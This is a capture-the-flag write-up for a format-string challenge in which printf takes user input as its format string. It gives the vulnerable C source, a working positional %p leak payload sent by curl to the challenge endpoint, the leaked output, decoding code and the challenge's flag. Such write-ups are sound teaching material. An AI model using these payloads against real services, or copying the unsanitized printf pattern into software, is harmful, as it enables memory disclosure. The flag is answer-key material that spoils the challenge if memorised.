## 1. Challenge Overview

We are given a remote service that runs a static ELF binary (`service`). The binary reads a secret flag into memory and then uses `printf` with a user-supplied format string. The goal is to leak the flag from memory without reading the flag file directly.

The challenge provides:
- `service` – the vulnerable binary
- `service.c` – source code
- `client.py` – a helper client to send binary payloads to `/run`
- `transport.txt` – notes about the environment
- `bundle.zip` – optional

---

## 2. Source Code Analysis

### `service.c`
```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void reward(void) {
    char b[160] = {0};
    const char *p = getenv("FLAG_PATH");
    FILE *f = fopen(p ? p : "/run/secrets/flag", "r");
    if (f) { fgets(b, sizeof(b), f); fclose(f); puts(b); }
}

void setup(void) {
    alarm(2); setbuf(stdout, NULL); setbuf(stdin, NULL);
}

int main(void) {
    setup();
    uint64_t dispatch[16] = {0};
    char input[256] = {0};
    const char *p = getenv("FLAG_PATH");
    FILE *f = fopen(p ? p : "/run/secrets/flag", "r");
    if (!f) return 1;
    fread(dispatch, 1, sizeof(dispatch)-1, f);
    fclose(f);
    puts("Receipt message?");
    if (!fgets(input, sizeof(input), stdin)) return 0;
    printf(input, dispatch[0], dispatch[1], dispatch[2], dispatch[3],
                  dispatch[4], dispatch[5], dispatch[6], dispatch[7],
                  dispatch[8], dispatch[9], dispatch[10], dispatch[11],
                  dispatch[12], dispatch[13], dispatch[14], dispatch[15]);
}
```

**Key observations:**
- The flag is read into `dispatch[16]` (16 × 8 bytes = 128 bytes) from the file specified by `FLAG_PATH` or `/run/secrets/flag`.
- `printf` is called with `input` as the format string and the 16 values of `dispatch` as the variadic arguments.
- There is **no format string sanitization** – classic format string vulnerability.
- The binary is static, non-PIE, NX enabled, no stack canary (as noted in `transport.txt`). But we don’t need to bypass protections; we just need to leak the arguments.

### `client.py`
```python
#!/usr/bin/env python3
"""Send a single binary payload. Example: python3 client.py URL < payload.bin."""
import argparse, socket, sys, urllib.request

parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument("url", help="https://challenges.tibeb.org/UUID")
parser.add_argument("--ipv4", action="store_true", help="Use IPv4 on networks with broken IPv6")
args = parser.parse_args()
...
request = urllib.request.Request(args.url.rstrip("/") + "/run",
                                 data=sys.stdin.buffer.read(),
                                 headers={"Content-Type": "application/octet-stream",
                                          "User-Agent": "Tibeb-CTF-Client/1.0"}, method="POST")
with urllib.request.urlopen(request, timeout=15) as response:
    sys.stdout.buffer.write(response.read())
```

- The correct endpoint is **`/run`**, not the base URL.
- The payload is sent as raw binary in the POST body.

### `transport.txt`
- Linux x86-64, static ELF, NX on, no PIE, no stack canary.
- One new process per POST `/run`. Input limit 8192 bytes. Execution limit 3 seconds.
- Example: `python3 client.py https://challenges.tibeb.org/UUID < payload.bin`

---

## 3. Vulnerability Identification

The `printf(input, dispatch[0], ..., dispatch[15])` call is the core issue.  
Because `input` is fully controlled by the user, we can use format specifiers like `%p`, `%s`, `%x`, etc., to read values from the stack and registers. The 16 `dispatch` values are passed as arguments, so they will appear as the first 16 variadic arguments.

In x86-64 System V ABI, the first 6 integer/pointer arguments are passed in registers (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`), and the rest on the stack. However, `printf` itself uses the format string as the first argument (`rdi`), so the 16 dispatch values are the 2nd through 17th arguments.  
- `dispatch[0]` → `rsi`
- `dispatch[1]` → `rdx`
- `dispatch[2]` → `rcx`
- `dispatch[3]` → `r8`
- `dispatch[4]` → `r9`
- `dispatch[5]` → stack (first stack argument)
- … and so on.

When we use positional format specifiers like `%1$p`, `%2$p`, …, we are referencing the 1st, 2nd, … variadic arguments.  
- `%1$p` → first variadic argument = `dispatch[0]`  
- `%2$p` → `dispatch[1]`  
- …  
- `%16$p` → `dispatch[15]`

So we can simply print all 16 values with `%p` and decode them.

---

## 4. Exploitation Steps

### Step 1: Download the files
```bash
mkdir -p ~/printf-post && cd ~/printf-post
BASE="https://challenges.tibeb.org/c99f1a10-9288-4d78-9d26-0e8dea0c2227/downloads"
wget -q --show-progress "$BASE/service" "$BASE/service.c" "$BASE/client.py" "$BASE/transport.txt" "$BASE/bundle.zip"
```

### Step 2: Identify the correct endpoint
The base URL returns `Not found` or `error code: 1010`. The correct endpoint is `/run`, as shown in `client.py`.

### Step 3: Craft the leak payload
We want to print all 16 arguments as hex pointers. Use positional arguments:
```
%1$p|%2$p|%3$p|%4$p|%5$p|%6$p|%7$p|%8$p|%9$p|%10$p|%11$p|%12$p|%13$p|%14$p|%15$p|%16$p
```

Send it via `curl`:
```bash
curl -s -X POST \
  --data-binary '%1$p|%2$p|%3$p|%4$p|%5$p|%6$p|%7$p|%8$p|%9$p|%10$p|%11$p|%12$p|%13$p|%14$p|%15$p|%16$p' \
  'https://challenges.tibeb.org/c99f1a10-9288-4d78-9d26-0e8dea0c2227/run'
```

**Output:**
```
Receipt message?
0x72707b6265626974|0x736f705f66746e69|0x3037376165615f74|0x3832356237663337|0x7d376438303630|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)
```

### Step 4: Decode the hex values
The output gives five non-null 64-bit values. They are little-endian representations of the flag bytes.

We can decode them with Python:
```python
hexes = [
    '0x72707b6265626974',
    '0x736f705f66746e69',
    '0x3037376165615f74',
    '0x3832356237663337',
    '0x7d376438303630'
]
flag = b''
for h in hexes:
    val = int(h, 16)
    flag += val.to_bytes(8, 'little')
print(flag.decode())
```

**Output:**
```
tibeb{printf_post_aea77073f7b5280608d7}
```

---

## 5. The Flag

```
tibeb{printf_post_aea77073f7b5280608d7}
```

---

## 6. Tricky Points & Lessons Learned

1. **Correct endpoint:** The base challenge URL is not the service. The service listens on `/run`. Always check the provided client script or transport notes.
2. **Positional arguments:** Using `%1$p` directly references the first variadic argument, which is `dispatch[0]`. This bypasses the need to count stack offsets.
3. **Little-endian decoding:** x86-64 is little-endian. When you read a 64-bit value from memory, the bytes are reversed. You must convert to bytes with `to_bytes(8, 'little')` (or manually reverse) to get the correct ASCII.
4. **Null bytes:** The flag is shorter than 128 bytes, so the remaining `dispatch` entries are zero (`(nil)`). We only need the first five.
5. **No need for `%s`:** Because the flag is already loaded into the `dispatch` array and passed as integer arguments, we can leak it directly with `%p` without needing to dereference pointers. This is simpler than typical format string exploits that use `%s` to read arbitrary memory.
6. **Static binary, no PIE:** Not strictly needed for this exploit, but it means addresses are predictable if we needed more advanced techniques.
7. **Alarm(2) and input limits:** The service has a 2-second alarm and 8192-byte input limit, but our payload is tiny.

---

## 7. Alternative Approach (using the provided client)

If you prefer to use `client.py`:
```bash
echo -n '%1$p|%2$p|%3$p|%4$p|%5$p|%6$p|%7$p|%8$p|%9$p|%10$p|%11$p|%12$p|%13$p|%14$p|%15$p|%16$p' > payload.bin
python3 client.py https://challenges.tibeb.org/c99f1a10-9288-4d78-9d26-0e8dea0c2227 < payload.bin
```

This will produce the same output.

---

**End of Write-up**
